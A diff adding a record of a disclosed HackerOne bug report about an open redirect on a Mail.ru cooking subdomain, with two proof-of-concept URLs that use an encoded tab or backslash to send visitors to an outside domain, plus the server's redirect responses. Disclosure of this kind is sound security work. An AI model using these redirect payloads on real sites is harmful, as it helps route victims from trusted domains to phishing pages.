@@ -1,0 +1,31 @@
+ReportLink:https://hackerone.com/reports/192373
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:02.03.2017 13:17:23
+
+Summary:
+
+**PoC**
+```
+Chrome, IE:
+https://cooking.lady.mail.ru/%09/blackfan.ru
+
+Chrome, IE, FireFox:
+https://cooking.lady.mail.ru/%5cblackfan.ru
+```
+
+**HTTP Response**
+```http
+HTTP/1.1 301 Moved Permanently
+...
+Location: /	/blackfan.ru/
+```
+```http
+HTTP/1.1 301 Moved Permanently
+...
+Location: /\blackfan.ru/
+```
